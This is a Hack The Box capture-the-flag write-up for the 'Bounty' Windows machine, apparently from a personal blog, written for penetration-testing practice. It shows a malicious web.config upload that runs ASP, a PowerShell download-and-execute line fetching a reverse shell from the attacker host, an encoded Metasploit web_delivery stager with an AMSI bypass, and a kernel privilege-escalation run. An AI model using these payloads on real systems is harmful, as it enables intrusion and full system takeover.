+++
date = '2025-02-14T11:11:01-05:00'
draft = false
title = 'Htb Bounty'
tags = ['writeup','hackthebox','easy','windows']
hideToc = false
+++
![HtB-Bounty](/images/Bounty.png)

Bounty is an easy to medium difficulty machine, which features an interesting technique to bypass file uploader protections and achieve code execution. This machine also highlights the importance of keeping systems updated with the latest security patches.

<!--more-->
---

## Scanning

### nmap

```sh
┌──(pl4stic㉿kali)-[~/htb/bounty]
└─$ nmap -T4 -p- -A 10.129.96.100                                                     
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-14 09:10 EST
Nmap scan report for 10.129.96.100
Host is up (0.025s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-title: Bounty
|_http-server-header: Microsoft-IIS/7.5
| http-methods: 
|_  Potentially risky methods: TRACE
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 2008|7|Vista|Phone|2012|8.1 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_8.1
Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (97%), Microsoft Windows Server 2008 R2 or Windows 7 SP1 (92%), Microsoft Windows Vista or Windows 7 (92%), Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Embedded Standard 7 (91%), Microsoft Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 R2 or Windows 8.1 (89%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

### IIS 7.5 - 80/tcp

![bounty1](/images/bounty1.png)

We're greeted with a very basic webpage running on port 80, with IIS 7.5 on the backend. Let's see what files and directories exist on the web server. Since this is an IIS server, I'll include `.asp` and `.aspx` in my search.

```sh
┌──(pl4stic㉿kali)-[~/htb/bounty]
└─$ gobuster dir -u http://10.129.96.100/ -w /usr/share/wordlists/dirb/big.txt -x .asp,.aspx
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.96.100/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              asp,aspx
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/aspnet_client        (Status: 301) [Size: 158] [--> http://10.129.96.100/aspnet_client/]
/transfer.aspx        (Status: 200) [Size: 941]
/uploadedfiles        (Status: 301) [Size: 158] [--> http://10.129.96.100/uploadedfiles/]
Progress: 61407 / 61410 (100.00%)
===============================================================
Finished
===============================================================
```

`/transfer.aspx` looks like an interesting endpoint, almost as if there might be some sort of file upload vulnerability that exists (especially with the `/uploadedfiles` directory.

![bounty2](/images/bounty2.png)

## Initial Access

### File Upload Vulnerability

The file upload page seems to limit the types of files it will accept; I tried at first with a simple `.txt` file, which was denied.

![bounty3](/images/bounty3.png)

I played with the POST request in BurpSuite and discovered the only type of file validation going on is utilizing the file extension.  This can be seen here where I changed the extension from `.txt` to `.png`.

![bounty4](/images/bounty4.png)

And, it would appear the uploaded files simply get dumped in the `/uploadedfiles` directory without any type of renaming. I'll use a wordlist of common file extensions and use Intruder to test which file extensions might be allowed by the upload form.

![bounty5](/images/bounty5.png)

After trying some of the more common file upload techniques to get a webshell with `.asp`, `.aspx`, `.php`, etc., I realized I may have to find another way. There's one other filetype we're allowed to upload that struck me as interesting, and prompted a few Google searches: `.config`. I came across an article that detailed a possible way in: [IIS - Web.config File Exploit](https://www.ivoidwarranties.tech/posts/pentesting-tuts/iis/web-config/)

>Sometimes IIS supports ASP files but it is not possible to upload any file with .ASP extension. In this case, it is possible to use a web.config file directly to run ASP classic codes.

### Web.config

From the link posted above, I'll start with this `.xml` file as a base:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
<%
Response.write("-"&"->")
' it is running the ASP code if you can see 3 by opening the web.config file!
Response.write(1+2)
Response.write("<!-"&"-")
%>
-->
```

Next, want to upgrade this pretty quickly to a reverse shell, as there's some sort of script that clears out the uploads fairly frequently.  I opted to use Nishang's [revere shell](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) (coded in PowerShell) for this.

Since we want the reverse shell to activate on its own, be sure to add the following snippet to the bottom of `Invoke-PowerShellTcp.ps1`:

```PowerShell
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.141 -Port 4444
```

Now start a web server on your attack box wherever your `.ps1` reverse shell is located.

The next step is to modify the `web.config` file to download and execute the reverse shell.  We can do that by adding the following code to the bottom of the file.

```xml
<%@ Language=VBScript %> <% call Server.CreateObject("WSCRIPT.SHELL").Run("cmd.exe /c powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.14.5/Invoke-PowerShellTcp.ps1')") %>
```

Everything should be ready... make sure you've done the following:
1) Modified `Invoke-PowerShellTcp.ps1`
2) HTTP server running on attack box to download `.ps1`
3) Netcat listener running
4) Upload and navigate to `web.config`
5) Enjoy your shell

```sh
┌──(pl4stic㉿kali)-[~/htb/bounty]
└─$ nc -nvlp 4444                    
listening on [any] 4444 ...
connect to [10.10.14.141] from (UNKNOWN) [10.129.149.214] 49158
Windows PowerShell running as user BOUNTY$ on BOUNTY
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\windows\system32\inetsrv> whoami
bounty\merlin
```

## Privilege Escalation

### Upgrade to Meterpreter

One of my favorite ways to grab a meterpreter shell from a regular shell is with the `multi/script/web_delivery` module in Metasploit. Provide the necessary parameters, and the exploit will give you the exact code to run on the target machine to grab your meterpreter shell.

```sh
┌──(pl4stic㉿kali)-[~/htb/bounty]
└─$ msfconsole

msf6 > use exploit/multi/script/web_delivery
msf6 exploit(multi/script/web_delivery) > set target 2   # PowerShell
msf6 exploit(multi/script/web_delivery) > set payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/script/web_delivery) > set LHOST tun0
msf6 exploit(multi/script/web_delivery) > set LPORT 5555
msf6 exploit(multi/script/web_delivery) > run
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
msf6 exploit(multi/script/web_delivery) > 
[*] Started reverse TCP handler on 10.10.14.141:5555 
[*] Using URL: http://10.10.14.141:8080/okstoKcx
[*] Server started.
[*] Run the following command on the target machine:
powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABtAEkATQAzAFoAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AGkAZgAoAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFAAcgBvAHgAeQBdADoAOgBHAGUAdABEAGUAZgBhAHUAbAB0AFAAcgBvAHgAeQAoACkALgBhAGQAZAByAGUAcwBzACAALQBuAGUAIAAkAG4AdQBsAGwAKQB7ACQAbQBJAE0AMwBaAC4AcAByAG8AeAB5AD0AWwBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARwBlAHQAUwB5AHMAdABlAG0AVwBlAGIAUAByAG8AeAB5ACgAKQA7ACQAbQBJAE0AMwBaAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMQA0ADEAOgA4ADAAOAAwAC8AbwBrAHMAdABvAEsAYwB4AC8AdgBuAFIATQBSAHkAdQBBAFEAYQB1AFAAJwApACkAOwBJAEUAWAAgACgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADEANAAxADoAOAAwADgAMAAvAG8AawBzAHQAbwBLAGMAeAAnACkAKQA7AA==
[*] 10.129.149.214   web_delivery - Delivering AMSI Bypass (1389 bytes)
[*] 10.129.149.214   web_delivery - Delivering Payload (3727 bytes)
[*] Sending stage (203846 bytes) to 10.129.149.214
[*] Meterpreter session 1 opened (10.10.14.141:5555 -> 10.129.149.214:49164) at 2025-02-14 10:37:06 -0500
```

### Local Exploit Suggester

During initial enumeration, it appeared this machine had no hotfixes applied and would likely be vulnerable to some sort of kernel exploit. I like to use the `local_exploit_suggester` module to quickly identify these for testing.

```sh
meterpreter > run post/multi/recon/local_exploit_suggester
[...snip...]
[*] 10.129.149.214 - Valid modules for session 1:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/bypassuac_comhijack                      Yes                      The target appears to be vulnerable.                                                                                                 
 2   exploit/windows/local/bypassuac_dotnet_profiler                Yes                      The target appears to be vulnerable.                                                                                                 
 3   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.                                                                                                 
 4   exploit/windows/local/bypassuac_sdclt                          Yes                      The target appears to be vulnerable.                                                                                                 
 5   exploit/windows/local/cve_2019_1458_wizardopium                Yes                      The target appears to be vulnerable.                                                                                                 
 6   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   Yes                      The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build detected!                      
 7   exploit/windows/local/cve_2020_1054_drawiconex_lpe             Yes                      The target appears to be vulnerable.                                                                                                 
 8   exploit/windows/local/cve_2021_40449                           Yes                      The service is running, but could not be validated. Windows 7/Windows Server 2008 R2 build detected!                                 
 9   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.                                                                                                 
 10  exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.                                                                                                 
 11  exploit/windows/local/ms16_075_reflection                      Yes                      The target appears to be vulnerable.                                                                                                 
 12  exploit/windows/local/ms16_075_reflection_juicy                Yes                      The target appears to be vulnerable.
```

### cve_2019_1458_wizardopium

This exploit immediately jumped out at me because of the wizard picture on the web server we saw at the very beginning. Worth a shot!

```sh
msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/cve_2019_1458_wizardopium
msf6 exploit(windows/local/cve_2019_1458_wizardopium) > set SESSION 1
SESSION => 1
msf6 exploit(windows/local/cve_2019_1458_wizardopium) > set LPORT 4545
LPORT => 4545
msf6 exploit(windows/local/cve_2019_1458_wizardopium) > set LHOST tun0
LHOST => 10.10.14.141
msf6 exploit(windows/local/cve_2019_1458_wizardopium) > run
[*] Started reverse TCP handler on 10.10.14.141:4545 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] Triggering the exploit...
[*] Launching msiexec to host the DLL...
[+] Process 512 launched.
[*] Reflectively injecting the DLL into 512...
[*] Sending stage (203846 bytes) to 10.129.149.214
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Meterpreter session 2 opened (10.10.14.141:4545 -> 10.129.149.214:49165) at 2025-02-14 10:45:59 -0500

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```